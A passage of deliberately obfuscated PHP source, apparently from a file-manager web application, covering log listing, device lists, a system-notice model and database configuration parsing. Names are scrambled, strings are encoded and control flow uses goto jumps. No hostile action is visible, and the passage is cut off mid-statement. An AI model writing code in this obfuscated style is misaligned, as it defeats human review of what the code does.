$CÔİåÖåïµ[$d‡«ÇÜ„Î½[458]] : time(); $Aì˜½ñ¹À[$d‡«ÇÜ„Î½[197]] = array($d‡«ÇÜ„Î½[330], array($f½õê¬Ç¤ , $Dï²óğö‘•)); } if ($CÔİåÖåïµ[$d‡«ÇÜ„Î½[39]]) { $D´·‹ˆÆàµ = explode($d‡«ÇÜ„Î½[57], $CÔİåÖåïµ[$d‡«ÇÜ„Î½[39]]); $BØì‘§‡Ñ­ = $this->typeFile(); $AÔˆ……¼˜à = array(); foreach ($D´·‹ˆÆàµ as $EØÕ«õÍ‰è) { $AÔˆ……¼˜à[] = $EØÕ«õÍ‰è; if (isset($BØì‘§‡Ñ­[$EØÕ«õÍ‰è])) { $AÔˆ……¼˜à = array_merge($AÔˆ……¼˜à, $BØì‘§‡Ñ­[$EØÕ«õÍ‰è]); } } $AÔˆ……¼˜à = array_unique($AÔˆ……¼˜à); if ($AÔˆ……¼˜à) { $Aì˜½ñ¹À[$d‡«ÇÜ„Î½[39]] = array($d‡«ÇÜ„Î½[17], $AÔˆ……¼˜à); } } goto aÏŠæ°ä¿; eùäÂœÄù: $d‡«ÇÜ„Î½ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$CÔİåÖåïµ) { show_json(array()); } $Aì˜½ñ¹À = array(); goto bàŸ¦ğïè; F™­‘Ó¨‚‰: } private function ipAddress(&$c´§¹íŒİŒ) { $a£’•ŠÉ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!empty($c´§¹íŒİŒ[$a£’•ŠÉ[2504]])) { $dî±²¶°Á = IpLocation::get($c´§¹íŒİŒ[$a£’•ŠÉ[2504]]); } else { $dî±²¶°Á = LNG($a£’•ŠÉ[2505]); } $c´§¹íŒİŒ[$a£’•ŠÉ[2506]] = $dî±²¶°Á; } private function descZipDownload($DÊØÔ“±Ó, &$BÏõÉ™»îê) { $Aİ³©Äé½£ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!isset($DÊØÔ“±Ó[$Aİ³©Äé½£[2507]])) { return; } $Aâ–„ïŒ‘Ø = json_decode($DÊØÔ“±Ó[$Aİ³©Äé½£[2507]], !0); foreach ($Aâ–„ïŒ‘Ø as $EŞÁ¤ÔĞ¦·) { if (!IO::init($EŞÁ¤ÔĞ¦·[$Aİ³©Äé½£[85]])) { continue; } if (!($aã¥²ÀˆòÍ = IO::infoFull($EŞÁ¤ÔĞ¦·[$Aİ³©Äé½£[85]]))) { continue; } $DÊØÔ“±Ó[$Aİ³©Äé½£[85]] = $EŞÁ¤ÔĞ¦·[$Aİ³©Äé½£[85]]; $BÏõÉ™»îê[] = $DÊØÔ“±Ó[$Aİ³©Äé½£[378]] = $aã¥²ÀˆòÍ[$Aİ³©Äé½£[378]]; $BÏõÉ™»îê[] = $DÊØÔ“±Ó[$Aİ³©Äé½£[2323]] = $aã¥²ÀˆòÍ[$Aİ³©Äé½£[472]]; break; } return $DÊØÔ“±Ó; } private function getSourceList(&$B»Àù²‘¸™) { $F²ùÀŞ´‘— =& $_SERVER[çŞáÓæÚô‚Ô‡]; $féØã»ËªÕ = array(); foreach ($B»Àù²‘¸™ as $eÁ®ÄºÇ® => $a»‡Ñ†Ëä) { goto EÂÎ¸Ô´Í®; FÔ‰‘…É‘Š: $féØã»ËªÕ[] = $c„‡¬¼‹‘‘[$F²ùÀŞ´‘—[378]]; $féØã»ËªÕ[] = $c„‡¬¼‹‘‘[$F²ùÀŞ´‘—[2323]]; if ($c„‡¬¼‹‘‘[$F²ùÀŞ´‘—[39]] == $F²ùÀŞ´‘—[503]) { $féØã»ËªÕ[] = $c„‡¬¼‹‘‘[$F²ùÀŞ´‘—[414]][$F²ùÀŞ´‘—[1014]]; $féØã»ËªÕ[] = $c„‡¬¼‹‘‘[$F²ùÀŞ´‘—[414]][$F²ùÀŞ´‘—[1015]]; } goto eÀ¥…ñ‘É¿; EÂÎ¸Ô´Í®: $c„‡¬¼‹‘‘ = json_decode($a»‡Ñ†Ëä[$F²ùÀŞ´‘—[414]], !0); if ($a»‡Ñ†Ëä[$F²ùÀŞ´‘—[39]] == $F²ùÀŞ´‘—[2085]) { $c„‡¬¼‹‘‘ = $this->descZipDownload($c„‡¬¼‹‘‘, $féØã»ËªÕ); $B»Àù²‘¸™[$eÁ®ÄºÇ®][$F²ùÀŞ´‘—[414]] = json_encode($c„‡¬¼‹‘‘); continue; } if (strpos($a»‡Ñ†Ëä[$F²ùÀŞ´‘—[39]], $F²ùÀŞ´‘—[2324]) !== 0) { goto BİèËÁÂÜ ; EâºÈÖá: continue; goto FÍ¨•ëõÕ®; B…Ô†¶É™¨: $féØã»ËªÕ[] = $c„‡¬¼‹‘‘[$F²ùÀŞ´‘—[378]] = $c˜âØÛò·¥[$F²ùÀŞ´‘—[378]]; $féØã»ËªÕ[] = $c„‡¬¼‹‘‘[$F²ùÀŞ´‘—[2323]] = $c˜âØÛò·¥[$F²ùÀŞ´‘—[472]]; $B»Àù²‘¸™[$eÁ®ÄºÇ®][$F²ùÀŞ´‘—[414]] = json_encode($c„‡¬¼‹‘‘); goto EâºÈÖá; BİèËÁÂÜ : if (!isset($c„‡¬¼‹‘‘[$F²ùÀŞ´‘—[85]]) || strpos($a»‡Ñ†Ëä[$F²ùÀŞ´‘—[39]], $F²ùÀŞ´‘—[2508]) !== 0) { continue; } if (!IO::init($c„‡¬¼‹‘‘[$F²ùÀŞ´‘—[85]])) { continue; } if (!($c˜âØÛò·¥ = IO::infoFull($c„‡¬¼‹‘‘[$F²ùÀŞ´‘—[85]]))) { continue; } goto B…Ô†¶É™¨; FÍ¨•ëõÕ®: } goto FÔ‰‘…É‘Š; eÀ¥…ñ‘É¿: if ($c„‡¬¼‹‘‘[$F²ùÀŞ´‘—[39]] == $F²ùÀŞ´‘—[2331]) { $féØã»ËªÕ[] = $c„‡¬¼‹‘‘[$F²ùÀŞ´‘—[414]][$F²ùÀŞ´‘—[378]]; } goto Dô¯ÑÔŞ—; Dô¯ÑÔŞ—: } if (!$féØã»ËªÕ) { return array(); } return Model($F²ùÀŞ´‘—[761])->sourceListInfo($féØã»ËªÕ, !0); } private function logList($eÊğ¸ñ³ãí) { goto dƒá»ƒŸ‹; D‘„ó™…½â: return $B…âª¨äÌ; goto b¢òƒÒš‰ˆ; dÛ®—¾±Ä: $E›Úá¼¨¿É = array(); foreach ($eÊğ¸ñ³ãí as $C›‘æŒ©¬ï => $B·æ¯³©â¥) { goto eêšÓÖ¾ø; bñà®¯ÍÈ÷: $B·æ¯³©â¥[$DÌ‰Ÿ‹®[38]] = isset($BÖ¦Úƒê‚ó[$DÌ‰Ÿ‹®[38]]) ? $BÖ¦Úƒê‚ó[$DÌ‰Ÿ‹®[38]] : LNG($DÌ‰Ÿ‹®[2505]); $B·æ¯³©â¥[$DÌ‰Ÿ‹®[2372]] = isset($BÖ¦Úƒê‚ó[$DÌ‰Ÿ‹®[2372]]) ? $BÖ¦Úƒê‚ó[$DÌ‰Ÿ‹®[2372]] : $DÌ‰Ÿ‹®[43]; $B·æ¯³©â¥[$DÌ‰Ÿ‹®[1349]] = isset($Eöµ–âÖ½„[$b‚»Á›½ä]) ? $Eöµ–âÖ½„[$b‚»Á›½ä] : $Aß–â ŠñË; goto bæÉÆÈ„­; eêšÓÖ¾ø: $b‚»Á›½ä = $B·æ¯³©â¥[$DÌ‰Ÿ‹®[39]]; $BÖ¦Úƒê‚ó = isset($EÓØÊĞ¶áÌ[$B·æ¯³©â¥[$DÌ‰Ÿ‹®[1443]]]) ? $EÓØÊĞ¶áÌ[$B·æ¯³©â¥[$DÌ‰Ÿ‹®[1443]]] : !1; $Aß–â ŠñË = strpos($b‚»Á›½ä, $DÌ‰Ÿ‹®[2509]) === 0 ? LNG($DÌ‰Ÿ‹®[2510]) : LNG($DÌ‰Ÿ‹®[2505]); goto bñà®¯ÍÈ÷; B™¿™ê‘ß©: $this->ipAddress($B·æ¯³©â¥); if (strpos($b‚»Á›½ä, $DÌ‰Ÿ‹®[2324]) === 0 || isset($dº«Ú‰åÓ„[$DÌ‰Ÿ‹®[2323]])) { goto EÁŒ‹ÚŠá; eç´³ˆ¥¬: if ($dº«Ú‰åÓ„[$DÌ‰Ÿ‹®[2336]] && $dº«Ú‰åÓ„[$DÌ‰Ÿ‹®[2336]][$DÌ‰Ÿ‹®[380]] == $DÌ‰Ÿ‹®[1087]) { $E›Úá¼¨¿É[] = $B·æ¯³©â¥[$DÌ‰Ÿ‹®[376]]; unset($eÊğ¸ñ³ãí[$C›‘æŒ©¬ï]); continue; } goto BÏÍ³°„†Ã; EÁŒ‹ÚŠá: $dº«Ú‰åÓ„[$DÌ‰Ÿ‹®[400]] = $d³ã‘†÷œö[$dº«Ú‰åÓ„[$DÌ‰Ÿ‹®[378]]]; $dº«Ú‰åÓ„[$DÌ‰Ÿ‹®[2336]] = $d³ã‘†÷œö[$dº«Ú‰åÓ„[$DÌ‰Ÿ‹®[2323]]]; if ($dº«Ú‰åÓ„[$DÌ‰Ÿ‹®[39]] == $DÌ‰Ÿ‹®[503]) { $dº«Ú‰åÓ„[$DÌ‰Ÿ‹®[414]][$DÌ‰Ÿ‹®[1014]] = $d³ã‘†÷œö[$dº«Ú‰åÓ„[$DÌ‰Ÿ‹®[414]][$DÌ‰Ÿ‹®[1014]]]; $dº«Ú‰åÓ„[$DÌ‰Ÿ‹®[414]][$DÌ‰Ÿ‹®[1015]] = $d³ã‘†÷œö[$dº«Ú‰åÓ„[$DÌ‰Ÿ‹®[414]][$DÌ‰Ÿ‹®[1015]]]; } goto dÓ¨‹ó‰Ù; dÓ¨‹ó‰Ù: if ($dº«Ú‰åÓ„[$DÌ‰Ÿ‹®[39]] == $DÌ‰Ÿ‹®[2331]) { $dº«Ú‰åÓ„[$DÌ‰Ÿ‹®[414]][$DÌ‰Ÿ‹®[378]] = $d³ã‘†÷œö[$dº«Ú‰åÓ„[$DÌ‰Ÿ‹®[414]][$DÌ‰Ÿ‹®[378]]]; } if ($dº«Ú‰åÓ„[$DÌ‰Ÿ‹®[39]] == $DÌ‰Ÿ‹®[2080]) { $dº«Ú‰åÓ„[$DÌ‰Ÿ‹®[2336]] = $dº«Ú‰åÓ„[$DÌ‰Ÿ‹®[400]]; $dº«Ú‰åÓ„[$DÌ‰Ÿ‹®[2323]] = $dº«Ú‰åÓ„[$DÌ‰Ÿ‹®[2336]][$DÌ‰Ÿ‹®[378]]; $dº«Ú‰åÓ„[$DÌ‰Ÿ‹®[400]] = !1; $dº«Ú‰åÓ„[$DÌ‰Ÿ‹®[378]] = $DÌ‰Ÿ‹®[43]; } if ($dº«Ú‰åÓ„[$DÌ‰Ÿ‹®[400]] && $dº«Ú‰åÓ„[$DÌ‰Ÿ‹®[400]][$DÌ‰Ÿ‹®[380]] == $DÌ‰Ÿ‹®[1087]) { $E›Úá¼¨¿É[] = $B·æ¯³©â¥[$DÌ‰Ÿ‹®[376]]; unset($eÊğ¸ñ³ãí[$C›‘æŒ©¬ï]); continue; } goto eç´³ˆ¥¬; BÏÍ³°„†Ã: } $B·æ¯³©â¥[$DÌ‰Ÿ‹®[414]] = $dº«Ú‰åÓ„; goto FßÏğƒœ°ù; FßÏğƒœ°ù: unset($B·æ¯³©â¥[$DÌ‰Ÿ‹®[2511]]); $B…âª¨äÌ[] = $B·æ¯³©â¥; goto c±Šğğ¡—ß; bæÉÆÈ„­: $B·æ¯³©â¥[$DÌ‰Ÿ‹®[2267]] = $BÖ¦Úƒê‚ó; $dº«Ú‰åÓ„ = json_decode($B·æ¯³©â¥[$DÌ‰Ÿ‹®[414]], !0); $B·æ¯³©â¥[$DÌ‰Ÿ‹®[2504]] = isset($dº«Ú‰åÓ„[$DÌ‰Ÿ‹®[2504]]) ? $dº«Ú‰åÓ„[$DÌ‰Ÿ‹®[2504]] : $DÌ‰Ÿ‹®[43]; goto B™¿™ê‘ß©; c±Šğğ¡—ß: } $this->clearSystemPathLog($E›Úá¼¨¿É); goto D‘„ó™…½â; Bø±Ñì¨ºÆ: $d³ã‘†÷œö = $this->getSourceList($eÊğ¸ñ³ãí); $Eöµ–âÖ½„ = $this->typeAll(); $B…âª¨äÌ = array(); goto dÛ®—¾±Ä; dƒá»ƒŸ‹: $DÌ‰Ÿ‹® =& $_SERVER[çŞáÓæÚô‚Ô‡]; $FïÂ‰ã¼‰· = array_to_keyvalue($eÊğ¸ñ³ãí, $DÌ‰Ÿ‹®[43], $DÌ‰Ÿ‹®[1443]); $EÓØÊĞ¶áÌ = Model($DÌ‰Ÿ‹®[488])->userListInfo(array_unique($FïÂ‰ã¼‰·)); goto Bø±Ñì¨ºÆ; b¢òƒÒš‰ˆ: } private function clearSystemPathLog($eğƒä¯Şšƒ) { $eî”Ôï‘ê =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (count($eğƒä¯Şšƒ) == 0) { return; } $f¬Ú§øòÖë = array($eî”Ôï‘ê[376] => array($eî”Ôï‘ê[17], array_unique($eğƒä¯Şšƒ))); $this->where($f¬Ú§øòÖë)->delete(); } public function deviceList($B„ÜŠ‹ÃÕß, $Bºµƒ¾ÊÇé = 0) { $b„Æ‘ùÃĞ¢ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $AÊÁøÎÄô = array($b„Æ‘ùÃĞ¢[1443] => $B„ÜŠ‹ÃÕß, $b„Æ‘ùÃĞ¢[197] => array($b„Æ‘ùÃĞ¢[934], $Bºµƒ¾ÊÇé), $b„Æ‘ùÃĞ¢[39] => $b„Æ‘ùÃĞ¢[2053]); $EÅ¯ƒÄ˜À£ = array(); $EÌ„Ğ­­âª = $this->field($b„Æ‘ùÃĞ¢[2512])->where($AÊÁøÎÄô)->order($b„Æ‘ùÃĞ¢[2334])->limit(50)->select(); foreach ($EÌ„Ğ­­âª as $dáÒ½‚Šö => $C’ªŞÈ™®) { goto fî¾å……÷¬; D½ÅÃœÛ‡˜: unset($cÊ¦Ãƒ”­Õ[$b„Æ‘ùÃĞ¢[2504]]); $Eø¤ğ°Îí¿ = $this->deviceType($cÊ¦Ãƒ”­Õ[$b„Æ‘ùÃĞ¢[2325]]); if (isset($EÅ¯ƒÄ˜À£[$Eø¤ğ°Îí¿])) { continue; } goto FŒÚ‘£Å’·; fî¾å……÷¬: if ($dáÒ½‚Šö > 0 && abs($C’ªŞÈ™®[$b„Æ‘ùÃĞ¢[197]] - $EÌ„Ğ­­âª[$dáÒ½‚Šö - 1][$b„Æ‘ùÃĞ¢[197]]) < 5) { continue; } $cÊ¦Ãƒ”­Õ = json_decode($C’ªŞÈ™®[$b„Æ‘ùÃĞ¢[414]], !0); $C’ªŞÈ™®[$b„Æ‘ùÃĞ¢[2504]] = isset($cÊ¦Ãƒ”­Õ[$b„Æ‘ùÃĞ¢[2504]]) ? $cÊ¦Ãƒ”­Õ[$b„Æ‘ùÃĞ¢[2504]] : $b„Æ‘ùÃĞ¢[43]; goto D½ÅÃœÛ‡˜; FŒÚ‘£Å’·: $this->ipAddress($C’ªŞÈ™®); $C’ªŞÈ™®[$b„Æ‘ùÃĞ¢[414]] = $cÊ¦Ãƒ”­Õ; $EÅ¯ƒÄ˜À£[$Eø¤ğ°Îí¿] = $C’ªŞÈ™®; goto aš®»É³•; aš®»É³•: } return array_values($EÅ¯ƒÄ˜À£); } public function deviceType($C ˜‘¨Ô‡) { return $C ˜‘¨Ô‡; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\56\156\157\x74\x69\143\x65\x4c\151\163\x74"; public $field = array("\x6e\141\155\x65", "\143\157\x6e\164\145\x6e\x74", "\x61\x75\x74\x68", "\155\157\x64\x65", "\164\151\155\x65", "\x74\171\x70\x65", "\x6c\x65\166\x65\154", "\145\x6e\x61\x62\154\145", "\163\x6f\x72\164"); public function listData($F¢³®×‡µ = false, $fĞ½‚ìù½™ = "\x73\157\x72\164", $FÇ¹—°ôõê = false) { return parent::listData($F¢³®×‡µ, $fĞ½‚ìù½™, $FÇ¹—°ôõê); } public function add($B³áŠËàâƒ) { $e¯‘ò–ÑÇó =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Aº½çòÀÓÀ = time(); if ($B³áŠËàâƒ[$e¯‘ò–ÑÇó[22]] == $e¯‘ò–ÑÇó[2513]) { $Aº½çòÀÓÀ = strtotime($B³áŠËàâƒ[$e¯‘ò–ÑÇó[200]]); } $B³áŠËàâƒ[$e¯‘ò–ÑÇó[200]] = $Aº½çòÀÓÀ; return parent::insert($B³áŠËàâƒ); } public function update($AË· ‡Êëà, $cî¥ÖØÕØ¹) { goto FÏîˆƒ­ÚÓ; CéåÃˆ×: $bÇ›¯«µÃø = time(); if ($cî¥ÖØÕØ¹[$b¬Î‘ìõéå[22]] == $b¬Î‘ìõéå[2513]) { $bÇ›¯«µÃø = strtotime($cî¥ÖØÕØ¹[$b¬Î‘ìõéå[200]]); } $cî¥ÖØÕØ¹[$b¬Î‘ìõéå[200]] = $bÇ›¯«µÃø; goto fÚÓä÷ƒŠç; fÚÓä÷ƒŠç: return parent::update($AË· ‡Êëà, $cî¥ÖØÕØ¹); goto d…áëöòŞÇ; FÏîˆƒ­ÚÓ: $b¬Î‘ìõéå =& $_SERVER[çŞáÓæÚô‚Ô‡]; $C®Ò¬áßñî = $this->listData($AË· ‡Êëà); if (!$C®Ò¬áßñî) { return !1; } goto CéåÃˆ×; d…áëöòŞÇ: } public function remove($b’õø“Â± ) { $DîñŞ¦Éæµ = $this->listData($b’õø“Â± ); if (!$DîñŞ¦Éæµ || $DîñŞ¦Éæµ[$_SERVER[çŞáÓæÚô‚Ô‡][1087]]) { return !1; } return parent::remove($b’õø“Â± ); } public function sort($cÑá¦Ãø, $B‚„ÃÙ›Ôà) { return parent::update($cÑá¦Ãø, $B‚„ÃÙ›Ôà); } public function enable($bèƒó¶™ÏÌ, $CõÚ‘É™ïí) { return parent::update($bèƒó¶™ÏÌ, array($_SERVER[çŞáÓæÚô‚Ô‡][2514] => $CõÚ‘É™ïí)); } private function initUserOption() { $Cã³‡È›‚ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->optionType = $Cã³‡È›‚[2515]; $this->modelType = $Cã³‡È›‚[2516]; $this->field = array($Cã³‡È›‚[2517], $Cã³‡È›‚[38], $Cã³‡È›‚[200], $Cã³‡È›‚[39], $Cã³‡È›‚[2518], $Cã³‡È›‚[698], $Cã³‡È›‚[193]); } public function userNoticeGet($D´ŒÊŒ¼öÒ = false) { $this->initUserOption(); return parent::listData($D´ŒÊŒ¼öÒ, $_SERVER[çŞáÓæÚô‚Ô‡][376], !0); } public function userNoticeAdd($F›ñ¹¨¾¿Š) { $f„£Ñ‚Ô° =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->initUserOption(); $F½Òšİ…Éé = $this->findByKey($f„£Ñ‚Ô°[2517], $F›ñ¹¨¾¿Š[$f„£Ñ‚Ô°[376]]); if ($F½Òšİ…Éé) { return !0; } $d‘ÕÇĞ—Ñ = array($f„£Ñ‚Ô°[2517] => $F›ñ¹¨¾¿Š[$f„£Ñ‚Ô°[376]], $f„£Ñ‚Ô°[38] => $F›ñ¹¨¾¿Š[$f„£Ñ‚Ô°[38]], $f„£Ñ‚Ô°[200] => $F›ñ¹¨¾¿Š[$f„£Ñ‚Ô°[200]], $f„£Ñ‚Ô°[39] => isset($F›ñ¹¨¾¿Š[$f„£Ñ‚Ô°[39]]) ? $F›ñ¹¨¾¿Š[$f„£Ñ‚Ô°[39]] : 1, $f„£Ñ‚Ô°[2518] => isset($F›ñ¹¨¾¿Š[$f„£Ñ‚Ô°[2518]]) ? $F›ñ¹¨¾¿Š[$f„£Ñ‚Ô°[2518]] : 0, $f„£Ñ‚Ô°[698] => 0, $f„£Ñ‚Ô°[193] => 0); return parent::insert($d‘ÕÇĞ—Ñ); } public function userNoticeEdit($aŸºîÁé­, $FÌèÂ”¾Í) { $this->initUserOption(); return parent::update($aŸºîÁé­, $FÌèÂ”¾Í); } } goto e‚ˆç¶À„á; bÛËÔª‰˜: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\151\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\x65\161" => "\75", "\156\x65\x71" => "\x3c\76", "\x67\x74" => "\x3e", "\x65\147\x74" => "\x3e\x3d", "\x6c\x74" => "\74", "\x65\154\164" => "\x3c\x3d", "\156\x6f\x74\x6c\151\x6b\x65" => "\116\x4f\124\40\114\x49\113\105", "\154\x69\153\145" => "\x4c\x49\x4b\x45", "\151\x6e" => "\x49\116", "\x6e\x6f\164\151\156" => "\x4e\x4f\x54\x20\111\x4e", "\156\157\x74\40\x69\x6e" => "\x4e\x4f\124\x20\x49\x4e", "\142\x65\164\x77\145\x65\x6e" => "\102\x45\124\127\x45\x45\x4e", "\x6e\x6f\164\x62\x65\x74\167\x65\145\156" => "\x4e\117\124\x20\102\x45\124\x57\x45\x45\116", "\x6e\157\x74\40\142\145\x74\167\145\x65\156" => "\x4e\x4f\124\x20\x42\105\124\x57\x45\x45\x4e"); protected $selectSql = "\123\x45\114\x45\x43\x54\x25\104\x49\123\x54\x49\116\103\124\45\40\x25\x46\x49\x45\114\x44\45\40\106\x52\117\x4d\40\45\124\x41\102\x4c\105\x25\x25\x4a\117\111\116\x25\45\x57\110\x45\x52\x45\45\45\107\x52\x4f\x55\x50\45\x25\x48\101\x56\x49\x4e\107\x25\x25\x4f\122\104\105\122\45\x25\114\x49\x4d\111\124\x25\40\x25\125\x4e\111\117\116\x25\x25\x43\x4f\115\x4d\105\116\x54\x25"; protected $bind = array(); public static function getInstance() { $cË´×ùÔæÎ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[çŞáÓæÚô‚Ô‡][881], $cË´×ùÔæÎ); } public function factory($e¹¾ßï·„ = '') { goto fé’àÓ’Å; FŞÏØÄø²: return $BƒµÄººº; goto CÀ÷ Å‰¿¼; DËØê‹ª¸µ: $this->dbType = ucwords(strtolower($e¹¾ßï·„[$cì£•¯­‡†[882]])); $C„à²Òà = $cì£•¯­‡†[884] . $this->dbType; if (class_exists($C„à²Òà)) { $BƒµÄººº = new $C„à²Òà($e¹¾ßï·„); if ($cì£•¯­‡†[732] != strtolower($e¹¾ßï·„[$cì£•¯­‡†[882]])) { $BƒµÄººº->dbType = strtoupper($this->dbType); } else { $BƒµÄººº->dbType = $this->_getDsnType($e¹¾ßï·„[$cì£•¯­‡†[834]]); } } else { think_exception(think_lang($cì£•¯­‡†[885]) . $cì£•¯­‡†[886] . $C„à²Òà); } goto FŞÏØÄø²; fé’àÓ’Å: $cì£•¯­‡† =& $_SERVER[çŞáÓæÚô‚Ô‡]; $e¹¾ßï·„ = $this->parseConfig($e¹¾ßï·„); if (empty($e¹¾ßï·„[$cì£•¯­‡†[882]])) { think_exception(think_lang($cì£•¯­‡†[883])); } goto DËØê‹ª¸µ; CÀ÷ Å‰¿¼: } public function __call($D”‡ÜÕ–£„, $C¿ãëŠóÑ¨) { if (method_exists($this, $D”‡ÜÕ–£„)) { return call_user_func_array(array($this, $D”‡ÜÕ–£„), $C¿ãëŠóÑ¨); } } protected function _getDsnType($AŒâ££­„Ê) { $E«ÉÑÔ«º = explode($_SERVER[çŞáÓæÚô‚Ô‡][4], $AŒâ££­„Ê); $D³‰Ôë„ = strtoupper(trim($E«ÉÑÔ«º[0])); return $D³‰Ôë„; } private function parseConfig($cÙßòÒŒÊÔ = '') { $E·¶Ò®ç  =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!empty($cÙßòÒŒÊÔ) && is_string($cÙßòÒŒÊÔ)) { $cÙßòÒŒÊÔ = $this->parseDSN($cÙßòÒŒÊÔ); } elseif (is_array($cÙßòÒŒÊÔ)) { $cÙßòÒŒÊÔ = array_change_key_case($cÙßòÒŒÊÔ); $cÙßòÒŒÊÔ = array($E·¶Ò®ç [882] => $cÙßòÒŒÊÔ[$E·¶Ò®ç [731]], $E·¶Ò®ç [807] => $cÙßòÒŒÊÔ[$E·¶Ò®ç [887]], $E·¶Ò®ç [808] => $cÙßòÒŒÊÔ[$E·¶Ò®ç [888]], $E·¶Ò®ç [805] => $cÙßòÒŒÊÔ[$E·¶Ò®ç [889]], $E·¶Ò®ç [806] => $cÙßòÒŒÊÔ[$E·¶Ò®ç [890]], $E·¶Ò®ç [27] => $cÙßòÒŒÊÔ[$E·¶Ò®ç [891]], $E·¶Ò®ç [834] => $cÙßòÒŒÊÔ[$E·¶Ò®ç [733]], $E·¶Ò®ç [23] => isset($cÙßòÒŒÊÔ[$E·¶Ò®ç [892]]) ? $cÙßòÒŒÊÔ[$E·¶Ò®ç [892]] : array()); } elseif (empty($cÙßòÒŒÊÔ)) { if (think_config($E·¶Ò®ç [893]) && $E·¶Ò®ç [732] != strtolower(think_config($E·¶Ò®ç [894]))) { $cÙßòÒŒÊÔ = $this->parseDSN(think_config($E·¶Ò®ç [893])); } else { $cÙßòÒŒÊÔ = array($E·¶Ò®ç [882] => think_config($E·¶Ò®ç [894]), $E·¶Ò®ç [807] => think_config($E·¶Ò®ç [895]), $E·¶Ò®ç [808] => think_config($E·¶Ò®ç [896]), $E·¶Ò®ç [805] => think_config($E·¶Ò®ç [897]), $E·¶Ò®ç [806] => think_config($E·¶Ò®ç [898]), $E·¶Ò®ç [27] => think_config($E·¶Ò®ç [243]), $E·¶Ò®ç [834] => think_config($E·¶Ò®ç [893]), $E·¶Ò®ç [23] => think_config($E·¶Ò®ç [899])); } } return $cÙßòÒŒÊÔ; } protected function initConnect($a•‡•›Ÿˆ = true) { if (1 == think_config($_SERVER[çŞáÓæÚô‚Ô‡][28])) { $this->_linkID = $this->multiConnect($a•‡•›Ÿˆ); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($D•ˆäÌò³ğ = false) { $BãïÕ–Æøê =& $_SERVER[çŞáÓæÚô‚Ô‡]; static $Açà‘ŒÜ‘Š = array(); if (empty($Açà‘ŒÜ‘Š)) { foreach ($this->config as $fõõÁõ´ => $cêï—Ä½ƒ) { $Açà‘ŒÜ‘Š[$fõõÁõ´] = explode($BãïÕ–Æøê[57], $cêï—Ä½ƒ); } } if (think_config($BãïÕ–Æøê[900])) { if ($D•ˆäÌò³ğ) { $C‰‰š‡Û¼† = floor(mt_rand(0, think_config($BãïÕ–Æøê[901]) - 1)); } else { if (is_numeric(think_config($BãïÕ–Æøê[902]))) { $C‰‰š‡Û¼† = think_config($BãïÕ–Æøê[902]); } else { $C‰‰š‡Û¼† = floor(mt_rand(think_config($BãïÕ–Æøê[901]), count($Açà‘ŒÜ‘Š[$BãïÕ–Æøê[805]]) - 1)); } } } else { $C‰‰š‡Û¼† = floor(mt_rand(0, count($Açà‘ŒÜ‘Š[$BãïÕ–Æøê[805]]) - 1)); } $cÂÜİ—Öö— = array($BãïÕ–Æøê[807] => isset($Açà‘ŒÜ‘Š[$BãïÕ–Æøê[807]][$C‰‰š‡Û¼†]) ? $Açà‘ŒÜ‘Š[$BãïÕ–Æøê[807]][$C‰‰š‡Û¼†] : $Açà‘ŒÜ‘Š[$BãïÕ–Æøê[807]][0], $BãïÕ–Æøê[808] => isset($Açà‘ŒÜ‘Š[$BãïÕ–Æøê[808]][$C‰‰š‡Û¼†]) ? $Açà‘ŒÜ‘Š[$BãïÕ–Æøê[808]][$C‰‰š‡Û¼†] : $Açà‘ŒÜ‘Š[$BãïÕ–Æøê[808]][0], $BãïÕ–Æøê[805] => isset($Açà‘ŒÜ‘Š[$BãïÕ–Æøê[805]][$C‰‰š‡Û¼†]) ? $Açà‘ŒÜ‘Š[$BãïÕ–Æøê[805]][$C‰‰š‡Û¼†] : $Açà‘ŒÜ‘Š[$BãïÕ–Æøê[805]][0], $BãïÕ–Æøê[806] => isset($Açà‘ŒÜ‘Š[$BãïÕ–Æøê[806]][$C‰‰š‡Û¼†]) ? $Açà‘ŒÜ‘Š[$BãïÕ–Æøê[806]][$C‰‰š‡Û¼†] : $Açà‘ŒÜ‘Š[$BãïÕ–Æøê[806]][0], $BãïÕ–Æøê[27] => isset($Açà‘ŒÜ‘Š[$BãïÕ–Æøê[27]][$C‰‰š‡Û¼†]) ? $Açà‘ŒÜ‘Š[$BãïÕ–Æøê[27]][$C‰‰š‡Û¼†] : $Açà‘ŒÜ‘Š[$BãïÕ–Æøê[27]][0], $BãïÕ–Æøê[834] => isset($Açà‘ŒÜ‘Š[$BãïÕ–Æøê[834]][$C‰‰š‡Û¼†]) ? $Açà‘ŒÜ‘Š[$BãïÕ–Æøê[834]][$C‰‰š‡Û¼†] : $Açà‘ŒÜ‘Š[$BãïÕ–Æøê[834]][0], $BãïÕ–Æøê[23] => isset($Açà‘ŒÜ‘Š[$BãïÕ–Æøê[23]][$C‰‰š‡Û¼†]) ? $Açà‘ŒÜ‘Š[$BãïÕ–Æøê[23]][$C‰‰š‡Û¼†] : $Açà‘ŒÜ‘Š[$BãïÕ–Æøê[23]][0]); return $this->connect($cÂÜİ—Öö—, $C‰‰š‡Û¼†); } public function parseDSN($cÆàÃ…Áâø) { $cœ¬Úè½ÜÄ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (empty($cÆàÃ…Áâø)) { return !1; } $EŠ÷ˆİ‚ï¶ = parse_url($cÆàÃ…Áâø); if ($EŠ÷ˆİ‚ï¶[$cœ¬Úè½ÜÄ[178]]) { $Bä›¥ŒÍ£§ = array($cœ¬Úè½ÜÄ[882] => $EŠ÷ˆİ‚ï¶[$cœ¬Úè½ÜÄ[178]], 